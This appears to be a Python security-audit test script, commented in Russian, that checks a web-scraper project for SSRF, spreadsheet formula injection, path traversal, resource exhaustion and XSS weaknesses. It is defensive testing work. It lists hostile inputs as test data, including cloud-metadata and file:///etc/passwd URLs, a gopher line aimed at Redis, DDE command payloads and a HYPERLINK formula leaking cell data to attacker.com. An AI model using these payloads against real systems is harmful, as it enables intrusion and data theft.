#!/usr/bin/env python3
"""
🛡️ Enterprise Web Scraper — Security Audit & Stress Test Suite
==============================================================
Комплексный автоматизированный стресс-тест безопасности и устойчивости
кодовой базы Enterprise_Web_Scraper.

Проверяемые направления безопасности:
1. SSRF (Server-Side Request Forgery) & URL Schemes (CWE-918)
2. Formula Injection в Excel / CSV экспортере (CWE-1236)
3. Path Traversal при экспорте файлов и баз данных (CWE-22)
4. Denial of Service (DoS): Memory, Concurrency & Crawler Traps (CWE-400 / CWE-770)
5. XSS & HTML Sanitization в шаблонах Web Dashboard (CWE-79)
6. Zero-Pip / Offline совместимость и Graceful Shutdown (CWE-755)

Автор: V1PER (viper86rus-arch)
Лицензия: MIT (2026)
"""

import asyncio
import ipaddress
import os
import re
import signal
import sys
import tempfile
import unittest
from pathlib import Path
from typing import Dict, List, Tuple
from urllib.parse import urlparse

# Добавляем корневую директорию проекта в sys.path
PROJECT_ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(PROJECT_ROOT))

# Импорт модулей ядра с защитой от отсутствия внешних зависимостей
import main
from main import DatabaseStorage, ProductItem, ProxyManager, parse_args


# ==============================================================================
# ЦВЕТНОЙ ФОРМАТИРОВАННЫЙ ВЫВОД (СТАНДАРТНАЯ БИБЛИОТЕКА)
# ==============================================================================

class Colors:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"


def header(text: str) -> None:
    print(f"\n{Colors.BOLD}{Colors.CYAN}{'=' * 78}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.WHITE}🔍 {text}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}{'=' * 78}{Colors.RESET}")


def subheader(text: str) -> None:
    print(f"\n{Colors.BOLD}{Colors.YELLOW}--- [ {text} ] ---{Colors.RESET}")


def log_vuln(severity: str, cwe: str, title: str, details: str) -> None:
    badge_color = Colors.RED if severity in ("CRITICAL", "HIGH") else Colors.YELLOW
    print(f"  {badge_color}[{severity} - {cwe}]{Colors.RESET} {Colors.BOLD}{title}{Colors.RESET}")
    print(f"    {Colors.WHITE}└─> {details}{Colors.RESET}")


def log_pass(title: str, details: str) -> None:
    print(f"  {Colors.GREEN}[SECURE - PASS]{Colors.RESET} {title}")
    print(f"    {Colors.WHITE}└─> {details}{Colors.RESET}")


# ==============================================================================
# СТРЕСС-ТЕСТЫ БЕЗОПАСНОСТИ
# ==============================================================================

class SecurityAuditStressEngine:
    """Движок аудита и стресс-тестирования уязвимостей."""

    def __init__(self) -> None:
        self.findings: List[Dict[str, str]] = []

    def record_finding(self, severity: str, cwe: str, title: str, description: str, impact: str) -> None:
        self.findings.append({
            "severity": severity,
            "cwe": cwe,
            "title": title,
            "description": description,
            "impact": impact,
        })
        log_vuln(severity, cwe, title, description)

    # --------------------------------------------------------------------------
    # 1. ТЕСТИРОВАНИЕ SSRF И ВАЛИДАЦИИ СЕТЕВЫХ АДРЕСОВ (CWE-918)
    # --------------------------------------------------------------------------
    def test_ssrf_and_url_validation(self) -> None:
        subheader("ТЕСТ 1: SSRF и валидация URL / Private IP Ranges")

        dangerous_urls = [
            ("http://127.0.0.1:8080/admin", "Loopback IPv4"),
            ("http://localhost:3000/internal", "Localhost hostname"),
            ("http://0.0.0.0:80/", "Unspecified address IPv4"),
            ("http://169.254.169.254/latest/meta-data/", "AWS/GCP/Azure Cloud Metadata API"),
            ("http://10.0.0.1/api/keys", "Private RFC1918 (10.0.0.0/8)"),
            ("http://192.168.1.1/router-login", "Private RFC1918 (192.168.0.0/16)"),
            ("http://172.16.0.1/metrics", "Private RFC1918 (172.16.0.0/12)"),
            ("http://[::1]/secret", "IPv6 Loopback"),
            ("http://0177.0.0.1/", "Octal encoded 127.0.0.1"),
            ("http://2130706433/", "Dword integer encoded 127.0.0.1"),
            ("file:///etc/passwd", "Local file scheme"),
            ("gopher://127.0.0.1:6379/_INFO", "Gopher protocol injection"),
        ]

        allowed_ssrf: List[str] = []
        rejected_schemes: List[str] = []

        for url, desc in dangerous_urls:
            try:
                item = ProductItem(
                    sku="TEST-SSRF",
                    title="SSRF Audit Item",
                    price=10.0,
                    url=url,
                )
                allowed_ssrf.append(f"{url} ({desc})")
            except ValueError as e:
                rejected_schemes.append(url)

        # Проверка валидатора ProductItem.validate_url
        if any("127.0.0.1" in u or "169.254.169.254" in u or "localhost" in u for u in allowed_ssrf):
            self.record_finding(
                severity="HIGH",
                cwe="CWE-918",
                title="SSRF: Валидатор URL пропускает loopback, private IP и Cloud Metadata",
                description=(
                    f"ProductItem.validate_url проверяет только префикс ('http://', 'https://'), "
                    f"но не валидирует хост на принадлежность к приватным/облачным подсетям. "
                    f"Пропущены опасные URL: {', '.join(allowed_ssrf[:4])}..."
                ),
                impact="Возможность сканирования интранета и кражи учетных данных облака (AWS IAM, GCP metadata).",
            )
        else:
            log_pass("SSRF URL Validation", "Приватные адреса и локалхост успешно заблокированы.")

        # Проверка file:// и gopher://
        if "file:///etc/passwd" in rejected_schemes and "gopher://127.0.0.1:6379/_INFO" in rejected_schemes:
            log_pass("Protocol Scheme Check", "Схемы file:// и gopher:// успешно отвергнуты валидатором.")
        else:
            self.record_finding(
                severity="CRITICAL",
                cwe="CWE-918",
                title="Небезопасные URI схемы (file://, gopher://)",
                description="Парсер разрешает не-HTTP схемы, что создает риск LFI или сетевых атак.",
                impact="Чтение произвольных локальных файлов на сервере.",
            )

    # --------------------------------------------------------------------------
    # 2. ТЕСТИРОВАНИЕ CSV / EXCEL FORMULA INJECTION (CWE-1236)
    # --------------------------------------------------------------------------
    def test_formula_injection(self) -> None:
        subheader("ТЕСТ 2: Excel / CSV Formula Injection (CWE-1236)")

        test_payloads = [
            "=CMD('calc.exe')",
            "-2+3+cmd|' /C calc'!A0",
            "+1337*2",
            "@SUM(1,2)",
            "=HYPERLINK(\"http://attacker.com/leak?d=\"&A1,\"Click Me\")",
            "\t=1+1",
            "\r=cmd|'/C calc'!A0",
        ]

        # Проверяем, как ExcelReportExporter экранирует данные
        # Изучим реализацию ExcelReportExporter.export
        has_formula_protection = False
        import inspect
        source_code = inspect.getsource(main.ExcelReportExporter.export)

        # Проверка паттернов санитации в коде экспортера
        if re.search(r"startswith\s*\(\s*['\"]?[=+\-@]", source_code) or "strip().startswith" in source_code:
            has_formula_protection = True

        if not has_formula_protection:
            self.record_finding(
                severity="HIGH",
                cwe="CWE-1236",
                title="Excel Formula Injection: Отсутствует экранирование спецсимволов формул",
                description=(
                    "ExcelReportExporter добавляет поля товара (sku, title, category, url) "
                    "напрямую в ячейки OpenPyXL без нейтрализации ведущих символов '=', '+', '-', '@', '\\t', '\\r'. "
                    "Любой вредоносный сайт с заголовком вида '=HYPERLINK(...)' передает формулу клиенту."
                ),
                impact="Выполнение произвольных DDE команд или экспорт локальных данных при открытии отчета в MS Excel.",
            )
        else:
            log_pass("Excel Formula Injection Check", "Обнаружена нейтрализация формульных символов.")

    # --------------------------------------------------------------------------
    # 3. ТЕСТИРОВАНИЕ PATH TRAVERSAL (CWE-22)
    # --------------------------------------------------------------------------
    def test_path_traversal(self) -> None:
        subheader("ТЕСТ 3: Path Traversal при сохранении файлов и SQLite (CWE-22)")

        malicious_paths = [
            "../../../../../../tmp/evil_test_report.xlsx",
            "/tmp/arbitrary_scraper_report.xlsx",
            "../secret_data.db",
        ]

        # Проверяем app.py ScrapeRequest модель и эндпоинты
        app_file = PROJECT_ROOT / "app.py"
        app_code = app_file.read_text(encoding="utf-8") if app_file.exists() else ""

        # Проверка валидации путей в app.py
        has_path_sanitization = False
        if "Path(" in app_code and ("resolve()" in app_code or "safe_path" in app_code):
            if "parent" in app_code or "allowed" in app_code or "relative_to" in app_code:
                has_path_sanitization = True

        if not has_path_sanitization:
            self.record_finding(
                severity="HIGH",
                cwe="CWE-22",
                title="Path Traversal в FastAPI Web Dashboard (app.py)",
                description=(
                    "Параметры 'output' и 'db' в ScrapeRequest принимаются без валидации и каноникализации (relative_to). "
                    "Злоумышленник через POST /api/run может указать '../../../../tmp/file.xlsx' или системный путь "
                    "для создания/перезаписи произвольных файлов и баз данных, а затем скачать их через /api/download."
                ),
                impact="Перезапись произвольных файлов на сервере и несанкционированное чтение файловой системы.",
            )
        else:
            log_pass("Path Traversal Check", "Пути выходных файлов жестко ограничены целевой директорией.")

    # --------------------------------------------------------------------------
    # 4. ТЕСТИРОВАНИЕ CRAWLER TRAPS, MEMORY DOS И ОГРАНИЧЕНИЙ РЕСУРСОВ
    # --------------------------------------------------------------------------
    def test_memory_dos_and_crawler_traps(self) -> None:
        subheader("ТЕСТ 4: Memory DoS, Spider Traps и лимиты ресурсов (CWE-400 / CWE-770)")

        # Проверяем ScrapingEngine на наличие response size limit и redirect loop protection
        import inspect
        engine_source = inspect.getsource(main.ScrapingEngine)

        has_size_limit = "max_response_size" in engine_source or "content-length" in engine_source.lower()
        has_redirect_limit = "max_redirects" in engine_source or "visited_urls" in engine_source

        if not has_size_limit:
            self.record_finding(
                severity="MEDIUM",
                cwe="CWE-400",
                title="Отсутствие лимита размера скачиваемого HTML (Decompression Bomb / Memory DoS)",
                description=(
                    "ScrapingEngine.scrape_page вызывает page.goto() без контроля Content-Length и лимита объема тела ответа. "
                    "При отдаче сайтом-ловушкой 500 МБ gzip-бомбы или бесконечного потока Playwright исчерпает ОЗУ хоста."
                ),
                impact="Отказ в обслуживании (OOM Crash) и зависание воркеров парсинга.",
            )
        else:
            log_pass("Response Size Limit", "Установлен лимит на максимальный объем ответа.")

        # Проверяем валидацию concurrency и pages в app.py
        app_file = PROJECT_ROOT / "app.py"
        app_code = app_file.read_text(encoding="utf-8") if app_file.exists() else ""

        unbounded_inputs = False
        if "class ScrapeRequest" in app_code:
            # Ищем ge / le валидаторы
            if "ge=" not in app_code or "le=" not in app_code:
                unbounded_inputs = True

        if unbounded_inputs:
            self.record_finding(
                severity="MEDIUM",
                cwe="CWE-770",
                title="Неограниченные входные параметры параллелизма и страниц в Web API",
                description=(
                    "ScrapeRequest в app.py не ограничивает 'concurrency' и 'pages' через Pydantic Field(ge=1, le=N). "
                    "Запрос с concurrency=500 и pages=10000 приведет к лавинообразному созданию сотен процессов Chromium."
                ),
                impact="Исчерпание файловых дескрипторов, сетевых сокетов и зависание сервера.",
            )
        else:
            log_pass("Resource Input Validation", "Входные параметры веб-запроса строго лимитированы.")

    # --------------------------------------------------------------------------
    # 5. ТЕСТИРОВАНИЕ XSS В ШАБЛОНАХ WEB DASHBOARD (CWE-79)
    # --------------------------------------------------------------------------
    def test_xss_sanitization(self) -> None:
        subheader("ТЕСТ 5: XSS (Cross-Site Scripting) в Web Dashboard (CWE-79)")

        template_path = PROJECT_ROOT / "templates" / "index.html"
        if not template_path.exists():
            print(f"  {Colors.YELLOW}[SKIP]{Colors.RESET} Шаблон templates/index.html не найден.")
            return

        html_content = template_path.read_text(encoding="utf-8")

        # Проверяем функцию escHtml в JavaScript
        esc_match = re.search(r"function\s+escHtml\s*\((.*?)\)\s*\{([\s\S]*?)\}", html_content)
        if esc_match:
            esc_body = esc_match.group(2)
            escapes_amp = "&amp;" in esc_body
            escapes_lt = "&lt;" in esc_body
            escapes_gt = "&gt;" in esc_body
            escapes_quote = "&quot;" in esc_body or "&#34;" in esc_body
            escapes_single_quote = "&#39;" in esc_body or "&#x27;" in esc_body

            if not (escapes_quote and escapes_single_quote):
                self.record_finding(
                    severity="MEDIUM",
                    cwe="CWE-79",
                    title="Неполная экранизация XSS в JS-функции escHtml (пропущены кавычки)",
                    description=(
                        "Функция escHtml() в templates/index.html экранирует только '&', '<', '>', "
                        "но игнорирует двойные (\") и одинарные (') кавычки. "
                        "В случае подстановки логов или данных в HTML-атрибуты это приводит к XSS инъекции."
                    ),
                    impact="Потенциальный Stored/DOM XSS при отображении вредоносных заголовков страниц в UI.",
                )
            else:
                log_pass("XSS escHtml Sanitizer", "Функция escHtml корректно экранирует все 5 опасных HTML-символов.")

        # Проверка наличия Content-Security-Policy
        if "Content-Security-Policy" not in html_content:
            self.record_finding(
                severity="LOW",
                cwe="CWE-1021",
                title="Отсутствие метатега Content-Security-Policy (CSP) в HTML",
                description="В шаблоне отсутствует заголовок/метатег CSP для предотвращения инъекции внешних скриптов.",
                impact="Снижение эшелонированной защиты браузера оператора от вредоносных полезных нагрузок.",
            )
        else:
            log_pass("CSP Header", "Content-Security-Policy метатег присутствует.")

    # --------------------------------------------------------------------------
    # 6. ТЕСТИРОВАНИЕ ZERO-PIP / OFFLINE РЕЖИМА И GRACEFUL EXIT (CWE-755)
    # --------------------------------------------------------------------------
    def test_zero_pip_and_graceful_exit(self) -> None:
        subheader("ТЕСТ 6: Zero-Pip / Offline режим и Graceful Shutdown (CWE-755)")

        main_file = PROJECT_ROOT / "main.py"
        main_code = main_file.read_text(encoding="utf-8") if main_file.exists() else ""

        # Проверка флага --demo
        has_demo_flag = "--demo" in main_code

        if not has_demo_flag:
            self.record_finding(
                severity="MEDIUM",
                cwe="CWE-755",
                title="Отсутствие автономного офлайн-режима (--demo) без внешних зависимостей",
                description=(
                    "main.py завершает работу с sys.exit(1), если отсутствуют внешние модули (Playwright, OpenPyXL, Pydantic). "
                    "В архитектурном стандарте V1PER требуется автономный демонстрационный режим (--demo), "
                    "работающий на 100% чистой стандартной библиотеке Python."
                ),
                impact="Невозможность демонстрации платформы заказчику в изолированных средах без pip.",
            )
        else:
            log_pass("Zero-Pip / Demo Mode", "Флаг --demo и автономный режим реализованы.")

        # Проверка обработки SIGINT / KeyboardInterrupt
        has_sigint_handling = "KeyboardInterrupt" in main_code or "SIGINT" in main_code

        if not has_sigint_handling:
            self.record_finding(
                severity="LOW",
                cwe="CWE-755",
                title="Отсутствие чистого перехвата SIGINT (Ctrl+C, exit code 130)",
                description=(
                    "При остановке скрапера пользователем (Ctrl+C) в терминал выбрасывается сырой traceback. "
                    "Требуется graceful shutdown с корректным закрытием браузерных контекстов и пулов БД."
                ),
                impact="Потенциальное повреждение SQLite файла при аварийном разрыве транзакции.",
            )
        else:
            log_pass("SIGINT Graceful Exit", "Обработка прерывания сессии реализована штатно.")


# ==============================================================================
# ТОЧКА ВХОДА АУДИТА
# ==============================================================================

def run_security_audit() -> int:
    header("ENTERPRISE WEB SCRAPER: АВТОМАТИЗИРОВАННЫЙ АУДИТ БЕЗОПАСНОСТИ")
    print(f"{Colors.BOLD}Целевой каталог:{Colors.RESET} {PROJECT_ROOT}")
    print(f"{Colors.BOLD}Аудитор:{Colors.RESET} Senior Security Auditor & TechLead (V1PER)\n")

    engine = SecurityAuditStressEngine()

    engine.test_ssrf_and_url_validation()
    engine.test_formula_injection()
    engine.test_path_traversal()
    engine.test_memory_dos_and_crawler_traps()
    engine.test_xss_sanitization()
    engine.test_zero_pip_and_graceful_exit()

    header("СВОДКА РЕЗУЛЬТАТОВ АУДИТА БЕЗОПАСНОСТИ")

    critical_count = sum(1 for f in engine.findings if f["severity"] == "CRITICAL")
    high_count = sum(1 for f in engine.findings if f["severity"] == "HIGH")
    medium_count = sum(1 for f in engine.findings if f["severity"] == "MEDIUM")
    low_count = sum(1 for f in engine.findings if f["severity"] == "LOW")

    print(f"  🔴 {Colors.RED}Критические уязвимости (CRITICAL):{Colors.RESET} {critical_count}")
    print(f"  🟠 {Colors.RED}Высокий риск (HIGH):{Colors.RESET}            {high_count}")
    print(f"  🟡 {Colors.YELLOW}Средний риск (MEDIUM):{Colors.RESET}        {medium_count}")
    print(f"  🔵 {Colors.CYAN}Низкий риск (LOW):{Colors.RESET}            {low_count}")
    print(f"  📊 {Colors.BOLD}Всего замечаний:{Colors.RESET}                 {len(engine.findings)}\n")

    return 0 if len(engine.findings) == 0 else 1


if __name__ == "__main__":
    sys.exit(run_security_audit())
